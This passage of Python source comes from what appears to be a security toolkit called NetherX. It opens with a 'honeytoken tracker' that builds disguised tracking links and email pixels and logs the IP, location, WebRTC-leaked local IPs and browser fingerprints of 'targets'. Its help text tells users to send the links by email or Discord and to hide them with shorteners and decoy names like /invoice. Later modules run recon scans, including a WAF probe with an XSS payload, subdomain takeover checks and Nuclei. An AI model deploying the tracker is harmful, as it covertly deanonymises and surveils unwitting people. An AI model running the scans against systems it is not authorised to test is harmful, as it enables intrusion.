        vps = input(BOLD + "Enter VPS/cloud URL: " + RESET).strip()
        base_url = vps.rstrip('/')
    elif choice == '4':
        custom = input(BOLD + "Enter custom base URL: " + RESET).strip()
        base_url = custom.rstrip('/')
    else:
        print(RED + "[!] Invalid" + RESET)
        return

    if not base_url:
        print(RED + "[!] No URL" + RESET)
        return

    redirect = input(BOLD + "Redirect after capture (default: https://google.com): " + RESET).strip()
    if redirect:
        cfg['redirect_url'] = redirect
    cfg['last_base_url'] = base_url
    _tracker_save_config(cfg)

    print()
    print(BOLD + GREEN + "--- GENERATED TRACKING LINKS ---" + RESET)
    print()
    print("  " + BOLD + CYAN + "Full Tracker:" + RESET + "  " + YELLOW + base_url + "/track" + RESET)
    print("  " + BOLD + CYAN + "Pixel (email):" + RESET + " " + YELLOW + base_url + "/pixel.gif" + RESET)
    print("  " + BOLD + CYAN + "Fake Image:" + RESET + "    " + YELLOW + base_url + "/image.jpg" + RESET)
    print()
    print(BOLD + MAGENTA + "--- HTML EMBED ---" + RESET)
    print(CYAN + '<img src="' + base_url + '/pixel.gif" width="1" height="1" />' + RESET)
    print()
    print(GRAY + "Tip: URL shortener (bit.ly) se hide karo" + RESET)
    if choice == '1':
        print()
        print(YELLOW + "[!] REMEMBER: Use ngrok for HTTPS and no 'Not Secure' warning!" + RESET)

def _tracker_start_server():
    cfg = _tracker_load_config()
    port_input = input(BOLD + "Port (default 8080): " + RESET).strip()
    port = int(port_input) if port_input.isdigit() else 8080
    local_ip = _tracker_get_local_ip()

    print()
    print(GREEN + "[+] Starting Honeytoken Server..." + RESET)
    print(CYAN + "[*] Local:" + RESET + "   " + YELLOW + local_ip + ":" + str(port) + RESET)
    print(CYAN + "[*] Public:" + RESET + "  " + YELLOW + "http://" + local_ip + ":" + str(port) + RESET)
    print(GRAY + "    For HTTPS (no 'Not Secure'): ngrok http " + str(port) + RESET)
    print()

    server = HTTPServer(('0.0.0.0', port), TrackerHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()

    print(GREEN + "[+] Server running! Waiting for targets..." + RESET)
    print(YELLOW + "[!] Press Ctrl+C to stop" + RESET)
    print()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print()
        print(CYAN + "[*] Stopping server..." + RESET)
        server.shutdown()
        print(GREEN + "[+] Server stopped." + RESET)

def _tracker_view_logs():
    logs = _tracker_load_logs()
    if not logs:
        print()
        print(YELLOW + "[!] No captures yet." + RESET)
        return

    print()
    print(CYAN + BOLD + "--- CAPTURED THREATS (" + str(len(logs)) + " total) ---" + RESET)
    print()
    for i, entry in enumerate(logs[-15:], 1):
        real_idx = len(logs) - 15 + i
        bd = entry.get('browserData', {})
        geo = entry.get('geo', {})
        print("  " + CYAN + "[" + str(real_idx) + "]" + RESET + " " + entry['timestamp'][:19] + " | " + YELLOW + entry['ip'] + RESET + " | " + geo.get('city','?') + ", " + geo.get('country','?') + " | " + bd.get('p','?'))

    export = input("\n" + BOLD + "Export to CSV? (y/n): " + RESET).strip().lower()
    if export == 'y':
        csv_path = os.path.join(os.path.expanduser("~"), "netherx_tracker_export.csv")
        try:
            with open(csv_path, 'w') as f:
                f.write('"timestamp","ip","country","city","isp","platform","screen","user_agent","path"\n')
                for entry in logs:
                    geo = entry.get('geo', {})
                    bd = entry.get('browserData', {})
                    scr = bd.get('screen', {})
                    ua = entry.get('user_agent', '').replace(chr(34), chr(39))
                    f.write('"' + entry["timestamp"] + '","' + entry["ip"] + '","' + geo.get("country","") + '","' + geo.get("city","") + '","' + geo.get("isp","") + '","' + bd.get("p","") + '","' + str(scr.get("w","")) + 'x' + str(scr.get("h","")) + '","' + ua + '","' + entry.get("path","") + '"\n')
            print(GREEN + "[+] Exported: " + csv_path + RESET)
        except Exception as e:
            print(RED + "[!] Export failed: " + str(e) + RESET)

def _tracker_show_help():
    print()
    print(CYAN + BOLD + "======================= THREAT TRACKER HELP =======================" + RESET)
    print()
    print(BOLD + YELLOW + "What is captured?" + RESET)
    print("  IP, Geo-location, ISP, VPN/Proxy detection")
    print("  Browser: User-Agent, Platform, Vendor, Language")
    print("  Screen: Resolution, Viewport, Pixel Ratio, Color Depth")
    print("  Hardware: CPU cores, RAM, Touch support, WebDriver detection")
    print("  GPU: Vendor & Renderer via WebGL")
    print("  WebRTC: Local IP leak detection (finds IPs behind NAT/VPN)")
    print("  Canvas: Browser fingerprint hash")
    print("  Network: Online status, Timezone, Referrer")
    print()
    print(BOLD + YELLOW + "How to use:" + RESET)
    print("  1. Generate Link  -> Create tracking URL (use ngrok for HTTPS!)")
    print("  2. Start Server  -> Run the listener")
    print("  3. Deploy Link   -> Send to target (email, Discord, etc.)")
    print("  4. View Logs     -> Check captured data")
    print()
    print(BOLD + YELLOW + "Removing 'Not Secure' Warning:" + RESET)
    print("  " + RED + "HTTP links always show 'Not Secure'" + RESET)
    print("  " + GREEN + "Use ngrok (Option 2) for FREE HTTPS:" + RESET)
    print("    - Download ngrok.exe from https://ngrok.com/download")
    print("    - In new terminal: ngrok http 8080")
    print("    - Copy the https://xxxx.ngrok-free.app URL")
    print("    - Paste it when generating the link")
    print("    - This gives you a trusted HTTPS link!")
    print()
    print(BOLD + YELLOW + "Speed:" + RESET)
    print("  The decoy page loads in under 500ms")
    print("  Data collection: ~800ms")
    print("  Auto-redirect: ~1.2 seconds total")
    print("  No waiting, no blank pages!")
    print()
    print(BOLD + YELLOW + "Stealth Tips:" + RESET)
    print("  - URL shortener (bit.ly) se link hide karo")
    print("  - Endpoint boring naam do: /invoice, /receipt, /download")
    print("  - Redirect real site pe karo (Google, Dropbox, etc.)")
    print("  - Multiple honeytokens alag-alag jagah lagao")
    print()

def run_honeytoken_tracker():
    while True:
        _tracker_banner()
        print(CYAN + BOLD + "--- TRACKER MENU ---" + RESET)
        print()
        print("  " + CYAN + "[1]" + RESET + " " + BOLD + "Generate Tracking Link" + RESET)
        print("  " + CYAN + "[2]" + RESET + " " + BOLD + "Start Capture Server" + RESET)
        print("  " + CYAN + "[3]" + RESET + " " + BOLD + "View Captured Logs" + RESET)
        print("  " + CYAN + "[4]" + RESET + " " + BOLD + "Help & Info" + RESET)
        print("  " + CYAN + "[5]" + RESET + " " + BOLD + "Back to Main Menu" + RESET)
        print()
        choice = input(BOLD + "Select (1-5): " + RESET).strip()
        if choice == '1':
            _tracker_generate_links()
        elif choice == '2':
            _tracker_start_server()
        elif choice == '3':
            _tracker_view_logs()
        elif choice == '4':
            _tracker_show_help()
        elif choice == '5':
            break
        else:
            print(RED + "[!] Invalid" + RESET)
        input("\n" + YELLOW + "Press Enter to continue..." + RESET)

def show_developer_info():
    W = 74  # fixed inner width - guarantees perfectly aligned borders
    def row(text):
        return f"{CYAN}║{RESET}  " + pad_to_width(text, W) + f"  {CYAN}║{RESET}"
    border = '═' * (W + 4)
    print()
    print(f"{CYAN}╔{border}╗{RESET}")
    print(row(f"{BOLD}{MAGENTA}NetherX Cybersecurity Suite - Official Developer Information{RESET}"))
    print(f"{CYAN}╠{border}╣{RESET}")
    print(row(f"{BOLD}Lead Developer :{RESET}  {YELLOW}GᕼOᔕTᗰEOᗯ{RESET}"))
    print(row(f"{BOLD}Discord ID     :{RESET}  {GREEN}netherx_owner{RESET}"))
    print(row(f"{BOLD}Project Name   :{RESET}  {WHITE}NetherX Cyber Suite v4.0 Ultra{RESET}"))
    print(f"{CYAN}╠{border}╣{RESET}")
    print(row(f"{GRAY}This advanced AI-powered toolkit was engineered to help security{RESET}"))
    print(row(f"{GRAY}professionals, students, and researchers understand the modern{RESET}"))
    print(row(f"{GRAY}threat landscape. Thank you for using and supporting NetherX!{RESET}"))
    print(row(f"{GRAY}For support, updates, and community access, join us below:{RESET}"))
    print(f"{CYAN}╚{border}╝{RESET}")
    print()
    print(f"   {BOLD}{BLUE}🔗 NetherX Discord Bot Invite:{RESET}")
    print(f"   {CYAN}https://discord.com/oauth2/authorize?client_id=1476972192788123678{RESET}")
    print()
    print(f"   {BOLD}{MAGENTA}🛡️  NetherX Support Server:{RESET}")
    print(f"   {CYAN}https://discord.gg/MayErj6NPf{RESET}")
    print()

# ==================================================
# NETHERX v6.0 PRO PACK - LIVE INTEL / BOUNTY / PRO WORKFLOW
# ==================================================
REPORT_FINDINGS = []

def log_finding(module, severity, detail):
    REPORT_FINDINGS.append({'time': datetime.now(timezone.utc).isoformat(),
                            'module': module, 'severity': severity, 'detail': detail})

def get_optional_key(key_name, hint_url):
    cfg = load_config()
    key = cfg.get(key_name, '')
    if key:
        return key
    print_info(f'No {key_name} saved. Free key: {hint_url}')
    key = get_input(f"{BOLD}Paste your {key_name} (Enter = cancel): {RESET}")
    if not key:
        return None
    sv = get_input(f"{BOLD}Save key for next time? (y/n): {RESET}")
    if sv and sv.lower() == 'y':
        cfg[key_name] = key
        save_config(cfg)
        print_success('Key saved to config.')
    return key

def _http_json(url, headers=None, timeout=20):
    req = urllib.request.Request(url, headers=headers or {'User-Agent': 'NetherX/5.0'})
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return json.loads(resp.read().decode('utf-8', errors='ignore'))

# ---------- 59. VIRUSTOTAL ----------
def virustotal_lookup():
    key = get_optional_key('virustotal_api_key', 'https://www.virustotal.com/gui/sign-in')
    if not key: return
    ioc = get_input(f"{BOLD}Enter hash / IP / domain / URL: {RESET}")
    if not ioc: print_error('No IOC entered.'); return
    h = {'x-apikey': key, 'User-Agent': 'NetherX/5.0'}
    try:
        if re.fullmatch(r'[0-9a-fA-F]{32,64}', ioc):
            url = f'https://www.virustotal.com/api/v3/files/{ioc}'
        elif validate_ip(ioc):
            url = f'https://www.virustotal.com/api/v3/ip_addresses/{ioc}'
        elif ioc.startswith('http'):
            vid = base64.urlsafe_b64encode(ioc.encode()).decode().rstrip('=')
            url = f'https://www.virustotal.com/api/v3/urls/{vid}'
        else:
            url = f'https://www.virustotal.com/api/v3/domains/{ioc}'
        att = _http_json(url, h).get('data', {}).get('attributes', {})
        stats = att.get('last_analysis_stats', {})
        print_section('VIRUSTOTAL REPORT')
        print(f' Reputation: {att.get("reputation", "N/A")}')
        if stats:
            print(f' Malicious:  {RED}{stats.get("malicious", 0)}{RESET} | Suspicious: {stats.get("suspicious", 0)} | Harmless: {stats.get("harmless", 0)}')
        mal = stats.get('malicious', 0)
        log_finding('VirusTotal', 'CRITICAL' if mal >= 5 else 'HIGH' if mal > 0 else 'LOW',
                    f'{ioc} flagged malicious by {mal} vendors' if mal else f'{ioc} clean on VirusTotal')
    except urllib.error.HTTPError as e:
        if e.code == 404:
            print_error(f'404 Not Found: VirusTotal ne is IOC ko apne database mein nahi dekha. (Ya URL format check karein).')
        elif e.code in (401, 403):
            print_error(f'API Key Invalid ya expired. Please check your VT key.')
        elif e.code == 429:
            print_error(f'Rate limit hit. Free VT keys allow 4 requests/minute. Wait 60 seconds.')
        else:
            print_error(f'VirusTotal API error {e.code}.')
    except Exception as e:
        print_error(f'VirusTotal lookup failed: {e}')

# ---------- 60. SHODAN ----------
def deep_ip_intel():
    target = get_input(f"{BOLD}Enter IP address or Domain (e.g., 45.33.32.156): {RESET}")
    if not target: print_error('No target.'); return
    
    # Auto-resolve domain to IP if needed
    if not validate_ip(target):
        print_info(f'Resolving {target} to IP...')
        try:
            import socket
            target = socket.gethostbyname(target)
            print_success(f'Resolved to: {target}')
        except Exception:
            print_error('Could not resolve domain.'); return

    print_info(f'Gathering deep intelligence on {target} (No API key needed)...')
    try:
        # ip-api.com (Free, rich data, proxy detection)
        url1 = f"http://ip-api.com/json/{target}?fields=status,message,country,countryCode,regionName,city,lat,lon,isp,org,as,asname,proxy,hosting,query"
        data1 = _http_json(url1)
        
        # ipinfo.io (Free, good for ASN/Company)
        url2 = f"https://ipinfo.io/{target}/json"
        data2 = _http_json(url2)

        print_section(f'DEEP IP INTELLIGENCE: {target}')
        if data1.get('status') == 'success':
            print(f' Location:  {data1.get("city")}, {data1.get("regionName")}, {data1.get("country")}')
            print(f' Coords:    {data1.get("lat")}, {data1.get("lon")}')
            print(f' ISP:       {data1.get("isp")}')
            print(f' Org:       {data1.get("org")}')
            print(f' ASN:       {data1.get("as")} ({data1.get("asname")})')
            proxy = data1.get("proxy") or data1.get("hosting")
            print(f' Proxy/VPN: {RED}YES (Hosting/Proxy detected){RESET}' if proxy else f' Proxy/VPN: {GREEN}NO (Residential/Corporate){RESET}')
        else:
            print_warn('Primary lookup failed.')
            
        if 'hostname' in data2:
            print(f' Hostname:  {data2.get("hostname")}')
        if 'company' in data2:
            print(f' Company:   {data2.get("company", {}).get("name")}')
            
        log_finding('IP Intel', 'INFO', f'{target} analyzed: {data1.get("isp", "Unknown ISP")}')
    except Exception as e:
        print_error(f'IP Intel failed: {e}')

# ---------- 61. ABUSEIPDB ----------
def abuseipdb_check():
    key = get_optional_key('abuseipdb_api_key', 'https://www.abuseipdb.com/register')
    if not key: return
    ip = get_input(f"{BOLD}Enter IP address: {RESET}")
    if not validate_ip(ip): print_error('Invalid IP.'); return
    try:
        data = _http_json(f'https://api.abuseipdb.com/api/v2/check?ipAddress={ip}&maxAgeInDays=90',
                          {'Key': key, 'Accept': 'application/json', 'User-Agent': 'NetherX/5.0'})
        d = data.get('data', {})
        score = d.get('abuseConfidenceScore', 0)
        color = GREEN if score < 20 else YELLOW if score < 60 else RED
        print_section('ABUSEIPDB REPORT')
        print(f' Abuse Confidence: {color}{score}%{RESET} | Reports: {d.get("totalReports", 0)}')
        print(f' Country: {d.get("countryCode", "?")} | ISP: {d.get("isp", "?")} | Type: {d.get("usageType", "?")}')
        if score >= 60:
            log_finding('AbuseIPDB', 'HIGH', f'{ip} abuse confidence {score}%')
    except Exception as e:
        print_error(f'AbuseIPDB check failed: {e}')

# ---------- 62. NVD (LIVE, NO KEY) ----------
def nvd_cve_lookup():
    kw = get_input(f"{BOLD}Enter CVE ID or keyword (CVE-2021-44228 / apache): {RESET}")
    if not kw: print_error('No keyword.'); return
    print_info('Querying NIST NVD (live data)...')
    try:
        if kw.upper().startswith('CVE-'):
            url = f'https://services.nvd.nist.gov/rest/json/cves/2.0?cveId={kw.upper()}'
        else:
            url = f'https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={urllib.parse.quote(kw)}&resultsPerPage=5'
        data = _http_json(url, timeout=30)
        print_section(f'NVD RESULTS ({data.get("totalResults", 0)} total)')
        for v in data.get('vulnerabilities', [])[:5]:
            cve = v.get('cve', {})
            desc = next((d['value'] for d in cve.get('descriptions', []) if d['lang'] == 'en'), 'No description')
            cvss = ((cve.get('metrics', {}).get('cvssMetricV31') or cve.get('metrics', {}).get('cvssMetricV30') or [{}])[0])
            print(f' {BOLD}{cve.get("id")}{RESET} | CVSS {cvss.get("cvssData",{}).get("baseScore","N/A")} ({cvss.get("cvssData",{}).get("baseSeverity","N/A")})')
            print(f'   {desc[:150]}')
    except Exception as e:
        print_error(f'NVD lookup failed (rate limit? retry): {e}')

# ---------- 63. HIBP PASSWORD ----------
def hibp_password_check():
    pwd = get_input(f"{BOLD}Enter password (only hashed prefix is sent - private): {RESET}")
    if not pwd: print_error('No password.'); return
    sha1 = hashlib.sha1(pwd.encode()).hexdigest().upper()
    try:
        req = urllib.request.Request(f'https://api.pwnedpasswords.com/range/{sha1[:5]}', headers={'User-Agent': 'NetherX/5.0'})
        with urllib.request.urlopen(req, timeout=15) as resp:
            body = resp.read().decode()
        count = 0
        for line in body.splitlines():
            if ':' in line and line.strip().split(':')[0] == sha1[5:]:
                count = int(line.strip().split(':')[1])
                break
        print_section('HAVE I BEEN PWNED CHECK')
        if count > 0:
            print(f' {RED}[!] Password appeared {count:,} times in known breaches. DO NOT USE.{RESET}')
            log_finding('HIBP', 'HIGH', f'Password found {count} times in breaches')
        else:
            print(f' {GREEN}[+] Password not found in known breaches.{RESET}')
    except Exception as e:
        print_error(f'HIBP check failed: {e}')

# ---------- 64. SUBDOMAIN TAKEOVER ----------
TAKEOVER_SERVICES = ['github.io','herokuapp.com','shopify.com','azurewebsites.net','cloudfront.net',
                     'fastly.net','s3.amazonaws.com','tumblr.com','unbouncepages.com','wordpress.com',
                     'fly.io','netlify.app','readthedocs.io','ghost.io']

def subdomain_takeover_detector(sandbox):
    domain = safe_domain(get_input(f"{BOLD}Enter root domain: {RESET}"))
    if not validate_domain(domain): return
    try: sandbox.process.exec('apt-get install -y dnsutils > /dev/null 2>&1')
    except Exception: pass
    print_info('Fetching subdomains + CNAME takeover analysis...')
    script = f"""
import json, socket, subprocess, urllib.request
domain = {json.dumps(domain)}
subs = set()
try:
    url = 'https://crt.sh/?q=%25.' + domain + '&output=json'
    req = urllib.request.Request(url, headers={{'User-Agent': 'NetherX/5.0'}})
    with urllib.request.urlopen(req, timeout=25) as resp:
        for e in json.loads(resp.read().decode(errors='ignore')):
            for n in e.get('name_value', '').split('\\n'):
                n = n.strip().lower()
                if n and n.endswith(domain) and ' ' not in n:
                    subs.add(n)
except Exception as ex:
    print('[!] crt.sh failed: ' + str(ex))
services = {json.dumps(TAKEOVER_SERVICES)}
print('--- SUBDOMAIN TAKEOVER SCAN ---')
print('Subdomains found: ' + str(len(subs)))
for s in sorted(subs)[:40]:
    try:
        r = subprocess.run(['dig', '+short', 'CNAME', s], capture_output=True, text=True, timeout=5)
        cname = r.stdout.strip().splitlines()[0].rstrip('.') if r.stdout.strip() else ''
        if not cname:
            continue
        for svc in services:
            if cname.endswith(svc):
                try:
                    socket.gethostbyname(s)
                    print('[~] ' + s + ' -> ' + cname + ' (resolves, likely claimed)')
                except Exception:
                    print('[!] VULNERABLE? ' + s + ' -> ' + cname + ' (NXDOMAIN = dangling CNAME)')
    except Exception:
        continue
print('[OK] Takeover scan complete.')
"""
    output = run_remote_python(sandbox, script)
    print(f"\n{YELLOW}{output}{RESET}")
    if 'VULNERABLE?' in output:
        log_finding('Subdomain Takeover', 'CRITICAL', f'{domain}: dangling CNAME detected')

# ---------- 65. WAF DETECTOR ----------
def waf_detector(sandbox):
    target = safe_domain(get_input(f"{BOLD}Enter target domain: {RESET}"))
    if not validate_domain(target): return
    script = f"""
import urllib.request, urllib.error
target = {json.dumps(target)}
waf_signs = {{'cf-ray': 'Cloudflare', 'x-sucuri-id': 'Sucuri', 'akamai': 'Akamai', 'x-varnish': 'Varnish',
'imperva': 'Imperva', 'f5': 'F5 BIG-IP', 'mod_security': 'ModSecurity', 'wordfence': 'Wordfence', 'x-cdn': 'CDN WAF'}}
def get(url):
    try:
        req = urllib.request.Request(url, headers={{'User-Agent': 'NetherX/5.0'}})
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, dict(r.getheaders())
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers or {{}})
    except Exception:
        return None, {{}}
print('--- WAF DETECTION ---')
s1, h1 = get('https://' + target)
s2, h2 = get('https://' + target + '/?id=%27%22%3E%3Cscript%3Ealert(1)%3C/script%3E')
print('Normal request:  ' + str(s1))
print('Payload request: ' + str(s2))
detected = []
for k, v in {{str(a).lower(): str(b).lower() for a, b in (h1 or {{}}).items()}}.items():
    for sig, name in waf_signs.items():
        if sig in k or sig in v:
            detected.append(name)
if s1 == 200 and s2 in (403, 406, 429):
    detected.append('Behavioral block (payload rejected)')
if detected:
    for d in sorted(set(detected)):
        print('[+] WAF/CDN detected: ' + d)
else:
    print('[~] No WAF signatures detected.')
"""
    output = run_remote_python(sandbox, script)
    print(f"\n{YELLOW}{output}{RESET}")
    if 'No WAF signatures' in output:
        log_finding('WAF Detector', 'INFO', f'{target}: no WAF detected')

# ---------- 66. WP/CMS SCANNER ----------
def wp_cms_scanner(sandbox):
    target = safe_domain(get_input(f"{BOLD}Enter target domain: {RESET}"))
    if not validate_domain(target): return
    script = f"""
import urllib.request, urllib.error, re
target = {json.dumps(target)}
def fetch(path):
    try:
        req = urllib.request.Request('https://' + target + path, headers={{'User-Agent': 'NetherX/5.0'}})
        with urllib.request.urlopen(req, timeout=8) as r:
            return r.status, r.read(20000).decode(errors='ignore')
    except urllib.error.HTTPError as e:
        return e.code, ''
    except Exception:
        return None, ''
print('--- CMS / WORDPRESS SCAN ---')
s, body = fetch('/')
wp = False
if s == 200:
    if '/wp-content/' in body or 'wp-json' in body:
        wp = True
    m = re.search(r'content="WordPress ([0-9.]+)"', body)
    if m:
        wp = True
        print('[+] WordPress version: ' + m.group(1))
if fetch('/wp-login.php')[0] == 200:
    wp = True
    print('[+] wp-login.php accessible')
if fetch('/xmlrpc.php')[0] in (200, 405):
    print('[!] xmlrpc.php enabled (brute-force/amplification risk)')
if fetch('/readme.html')[0] == 200:
    print('[!] readme.html exposed (version disclosure)')
for p in ['woocommerce', 'elementor', 'contact-form-7', 'wordfence', 'yoast-seo']:
    s5, b5 = fetch('/wp-content/plugins/' + p + '/readme.txt')
    if s5 == 200:
        vm = re.search(r'Stable tag: ([0-9.]+)', b5)
        print('[+] Plugin: ' + p + (' v' + vm.group(1) if vm else ''))
if not wp:
    print('[~] No WordPress signatures found.')
"""
    output = run_remote_python(sandbox, script)
    print(f"\n{YELLOW}{output}{RESET}")

# ---------- 67. RECON PIPELINE ----------
def recon_pipeline(sandbox):
    target = safe_domain(get_input(f"{BOLD}Enter root domain for full recon: {RESET}"))
    if not validate_domain(target): return
    try: sandbox.process.exec('apt-get install -y dnsutils > /dev/null 2>&1')
    except Exception: pass
    print_info('Pipeline: subdomains -> live check -> takeover check...')
    script = f"""
import json, socket, subprocess, urllib.request, urllib.error
domain = {json.dumps(target)}
subs = set()
try:
    url = 'https://crt.sh/?q=%25.' + domain + '&output=json'
    req = urllib.request.Request(url, headers={{'User-Agent': 'NetherX/5.0'}})
    with urllib.request.urlopen(req, timeout=25) as resp:
        for e in json.loads(resp.read().decode(errors='ignore')):
            for n in e.get('name_value', '').split('\\n'):
                n = n.strip().lower()
                if n and n.endswith(domain) and ' ' not in n:
                    subs.add(n)
except Exception as ex:
    print('[!] subdomain fetch failed: ' + str(ex))
print('--- RECON PIPELINE: ' + domain + ' ---')
print('[1] Subdomains found: ' + str(len(subs)))
services = {json.dumps(TAKEOVER_SERVICES)}
live = 0
for s in sorted(subs)[:20]:
    try:
        ip = socket.gethostbyname(s)
    except Exception:
        continue
    status = '?'
    try:
        req = urllib.request.Request('https://' + s, headers={{'User-Agent': 'NetherX/5.0'}})
        with urllib.request.urlopen(req, timeout=6) as r:
            status = str(r.status)
    except urllib.error.HTTPError as e:
        status = str(e.code)
    except Exception:
        status = 'timeout'
    live += 1
    line = '[2] LIVE ' + s + ' (' + ip + ') HTTP ' + status
    try:
        r = subprocess.run(['dig', '+short', 'CNAME', s], capture_output=True, text=True, timeout=5)
        cname = r.stdout.strip().splitlines()[0].rstrip('.') if r.stdout.strip() else ''
        if cname:
            for svc in services:
                if cname.endswith(svc):
                    line += ' | CNAME -> ' + cname + ' (takeover check!)'
    except Exception:
        pass
    print(line)
print('[3] Live hosts: ' + str(live))
print('[OK] Pipeline complete.')
"""
    output = run_remote_python(sandbox, script)
    print(f"\n{YELLOW}{output}{RESET}")
    try:
        prompt = f"Recon pipeline results for {target}:\n\n{output}\n\nHighlight the most interesting targets for authorized testing."
        ai_assess(prompt)
    except Exception as e:
        print_error(f'AI analysis failed: {e}')

# ---------- 68. NUCLEI SCAN ----------
def nuclei_scan(sandbox):
    target = safe_domain(get_input(f"{BOLD}Enter target domain for Nuclei: {RESET}"))
    if not validate_domain(target): return
    print_info('Fetching latest Nuclei release via GitHub API & installing in sandbox...')
    
    install_script = """
import urllib.request, zipfile, os, platform, json

print('[*] Fetching latest Nuclei release info...')
try:
    req = urllib.request.Request('https://api.github.com/repos/projectdiscovery/nuclei/releases/latest', headers={'User-Agent': 'NetherX/5.0'})
    with urllib.request.urlopen(req, timeout=15) as resp:
        release = json.loads(resp.read().decode())
    
    arch = platform.machine()
    target_name = 'linux_arm64' if ('arm' in arch or 'aarch64' in arch) else 'linux_amd64'
        
    download_url = ''
    for asset in release.get('assets', []):
        if target_name in asset['name'] and asset['name'].endswith('.zip'):
            download_url = asset['browser_download_url']
            break
            
    if not download_url:
        print('[!] Could not find Nuclei download URL.')
        exit(1)
        
    print('[*] Downloading Nuclei from GitHub...')
    req = urllib.request.Request(download_url, headers={'User-Agent': 'NetherX/5.0'})
    with urllib.request.urlopen(req, timeout=120) as resp:
        with open('/tmp/nuclei.zip', 'wb') as f:
            f.write(resp.read())
            
    print('[+] Download complete. Extracting...')
    with zipfile.ZipFile('/tmp/nuclei.zip', 'r') as z:
        z.extractall('/tmp')
        
    if os.path.exists('/tmp/nuclei'):
        os.chmod('/tmp/nuclei', 0o755)
    else:
        for root, dirs, files in os.walk('/tmp'):
            if 'nuclei' in files:
                os.chmod(os.path.join(root, 'nuclei'), 0o755)
                break
    print('[+] Nuclei ready.')
except Exception as e:
    print('[!] Error: ' + str(e))
    exit(1)
"""
    try:
        install_out = run_remote_python(sandbox, install_script)
        print(install_out)
        if 'Nuclei ready' not in install_out:
            print_error("Nuclei installation failed in sandbox.")
            return
    except Exception as e:
        print_error(f"Install step failed: {e}")
        return

    print_info('Updating templates and running scan (this may take 1-2 mins)...')
    try:
        scan_cmd = "/tmp/nuclei -update-templates -silent && /tmp/nuclei -u https://" + target + " -severity critical,high,medium -nc -timeout 15 -c 25 2>&1 | tail -n 50"
        res = sandbox.process.exec(scan_cmd)
        output = res.result if hasattr(res, 'result') else str(res)
    except Exception as e:
        print_error(f"Nuclei scan failed: {e}")
        return
        
    print_section('NUCLEI SCAN RESULTS')
    clean_out = output.strip() if output else ''
    if not clean_out or 'no results' in clean_out.lower() or len(clean_out) < 15:
        print('(No critical/high/medium vulnerabilities found, or the target blocked us.)')
    else:
        print(clean_out)
    if clean_out and 'critical' in clean_out.lower():
        log_finding('Nuclei', 'CRITICAL', f'{target}: critical nuclei findings')

# ---------- 69. CVSS 3.1 CALCULATOR ----------
def cvss_calculator():
    print(f"{YELLOW}Example full vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H{RESET}")
    vec = get_input(f"{BOLD}Enter FULL CVSS 3.1 vector: {RESET}")
    if not vec: print_error('No vector.'); return
    vals = {}
    for part in vec.replace('CVSS:3.1/', '').replace('CVSS:3.0/', '').split('/'):
        if ':' in part:
            k, v = part.split(':')
            vals[k] = v
    AV = {'N': 0.85, 'A': 0.62, 'L': 0.55, 'P': 0.20}
    AC = {'L': 0.77, 'H': 0.44}
    UI = {'N': 0.85, 'R': 0.62}
    CIA = {'H': 0.56, 'L': 0.22, 'N': 0.0}
    try:
        required_keys = ['AV', 'AC', 'PR', 'UI', 'S', 'C', 'I', 'A']
        missing = [k for k in required_keys if k not in vals]
        if missing:
            print_error(f"Invalid vector. Missing metrics: {', '.join(missing)}. Please paste the FULL vector string.")
            return
            
        changed = vals.get('S') == 'C'
        PR = ({'N': 0.85, 'L': 0.68, 'H': 0.50} if changed else {'N': 0.85, 'L': 0.62, 'H': 0.27})[vals['PR']]
        isc = 1 - (1 - CIA[vals['C']]) * (1 - CIA[vals['I']]) * (1 - CIA[vals['A']])
        impact = 6.42 * isc if not changed else 7.52 * (isc - 0.029) - 3.25 * (isc - 0.02) ** 15
        expl = 8.22 * AV[vals['AV']] * AC[vals['AC']] * PR * UI[vals['UI']]
        if impact <= 0:
            score = 0.0
        elif not changed:
            score = math.ceil(min(impact + expl, 10) * 10) / 10
        else:
            score = math.ceil(min(1.08 * (impact + expl), 10) * 10) / 10
        sev = 'None' if score == 0 else 'Low' if score < 4.0 else 'Medium' if score < 7.0 else 'High' if score < 9.0 else 'Critical'
        color = GREEN if score < 4.0 else YELLOW if score < 7.0 else RED
        print_section('CVSS 3.1 BASE SCORE')
        print(f' Score:    {color}{BOLD}{score}{RESET}')
        print(f' Severity: {color}{sev}{RESET}')
    except KeyError as e:
        print_error(f'Invalid metric value in vector. Check AV/AC/PR/UI/S/C/I/A values.')
    except Exception as e:
        print_error(f'Calculation failed: {e}')

# ---------- 70. PENTEST REPORT GENERATOR ----------
def pentest_report_generator():
    target = get_input(f"{BOLD}Target/Project name: {RESET}") or 'Unnamed Engagement'
    tester = get_input(f"{BOLD}Tester name: {RESET}") or 'GᕼOTᗰEO'
    print(f'{BOLD}Paste extra notes/findings (type END to finish):{RESET}')
    notes = []
    while True:
        line = get_input('')
        if line is None or line.strip() == 'END':
            break
        notes.append(line)
    out = os.path.join(os.path.expanduser('~'), f'netherx_report_{datetime.now().strftime("%Y%m%d_%H%M%S")}.html')
    rows = ''
    for f in REPORT_FINDINGS:
        col = '#e74c3c' if f['severity'] in ('CRITICAL', 'HIGH') else '#f39c12' if f['severity'] == 'MEDIUM' else '#27ae60'
        rows += f'<tr><td>{f["time"][:19]}</td><td>{f["module"]}</td><td style="color:{col};font-weight:bold">{f["severity"]}</td><td>{f["detail"]}</td></tr>'
    html = f"""<!DOCTYPE html><html><head><meta charset="utf-8"><title>NetherX Pentest Report</title>
<style>body{{font-family:Segoe UI,Arial;background:#0f1117;color:#eee;padding:40px}}h1{{color:#667eea}}table{{width:100%;border-collapse:collapse;margin-top:20px}}td,th{{border:1px solid #333;padding:8px;text-align:left;font-size:14px}}th{{background:#1c2030}}</style></head>
<body><h1>🛡️ NetherX Penetration Test Report</h1>
<p><b>Project:</b> {target}<br><b>Tester:</b> {tester}<br><b>Generated:</b> {datetime.now().strftime('%Y-%m-%d %H:%M')}<br><b>Tool:</b> NetherX Cybersecurity Suite v6.0 Pro</p>
<h2>Automated Findings ({len(REPORT_FINDINGS)})</h2>
<table><tr><th>Time</th><th>Module</th><th>Severity</th><th>Finding</th></tr>{rows or '<tr><td colspan=4>No automated findings logged this session.</td></tr>'}</table>
<h2>Analyst Notes</h2><p>{'<br>'.join(notes) if notes else 'No additional notes.'}</p>
